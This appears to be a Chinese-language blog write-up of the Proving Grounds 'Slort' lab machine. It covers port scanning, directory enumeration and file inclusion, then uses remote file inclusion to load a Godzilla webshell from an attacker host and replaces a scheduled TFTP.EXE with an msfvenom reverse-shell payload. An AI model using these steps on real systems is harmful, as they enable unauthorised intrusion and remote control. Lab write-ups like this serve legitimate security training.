@@ -1,0 +1,31 @@
+<hr>
+<h2 id="title-Proving-Grounds-Slort-Writeupdate-2024-7-26categories-LabWriteuptags-Proving-Grounds"><a href="#title-Proving-Grounds-Slort-Writeupdate-2024-7-26categories-LabWriteuptags-Proving-Grounds" class="headerlink" title="title: Proving Grounds Slort Writeupdate: 2024-7-26categories: LabWriteuptags: Proving Grounds"></a>title: Proving Grounds Slort Writeup<br>date: 2024-7-26<br>categories: LabWriteup<br>tags: Proving Grounds</h2><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><pre><code class="bash">nmap 192.168.196.53 -p- -Pn --min-rate 2000 -sT -n
+</code></pre>
+<p>![image-20240706195058310]<a href="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240706195058310.png">https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240706195058310.png</a>)</p>
+<pre><code class="bash"> nmap 192.168.196.53 -p21,135,139,445,3306,4443,5040,7680,8080 -sC -sV
+</code></pre>
+<p>![image-20240706200131088]<a href="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240706200131088.png">https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240706200131088.png</a>)</p>
+<h4 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag:"></a>GetFlag:</h4><p>枚举目录：</p>
+<pre><code>dirsearch -u http://192.168.196.53:8080
+</code></pre>
+<p>![image-20240706200908729]<a href="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240706200908729.png">https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240706200908729.png</a>)</p>
+<p>URL中有疑似文件包含的参数：</p>
+<pre><code>http://192.168.196.53:8080/site/index.php?page=C:/windows/system32/drivers/etc/hosts
+</code></pre>
+<p>![image-20240706201934768]<a href="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240706201934768.png">https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240706201934768.png</a>)</p>
+<p>尝试远程包含：</p>
+<p>![image-20240707020412421]<a href="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240707020412421.png">https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240707020412421.png</a>)</p>
+<pre><code>http://192.168.236.53:8080/site/index.php?page=http://192.168.45.228/test.php
+</code></pre>
+<p>![image-20240707020436430]<a href="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240707020436430.png">https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240707020436430.png</a>)</p>
+<p>使用Godzilla Webshell:</p>
+<pre><code>http://192.168.236.53:8080/site/index.php?page=http://192.168.45.228/godzilla.php
+</code></pre>
+<p>在C盘backup下发现info.txt:</p>
+<p>![image-20240707021356062]<a href="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240707021356062.png">https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240707021356062.png</a>)</p>
+<p>文本中说明每五分钟会执行TFTP.EXE,且当前用户对TFTP.EXE有写入权限，将其直接替换为二进制文件即可：</p>
+<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.228 LPORT=443 -f exe -o TFTP.EXE
+</code></pre>
+<p>![image-20240707021648549]<a href="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240707021648549.png">https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240707021648549.png</a>)</p>
+<p>通过Godzilla Webshell将TFTP.EXE文件进行替换，等五分钟后即可：</p>
+<p>![image-20240707022223403]<a href="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240707022223403.png">https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240707022223403.png</a>)</p>
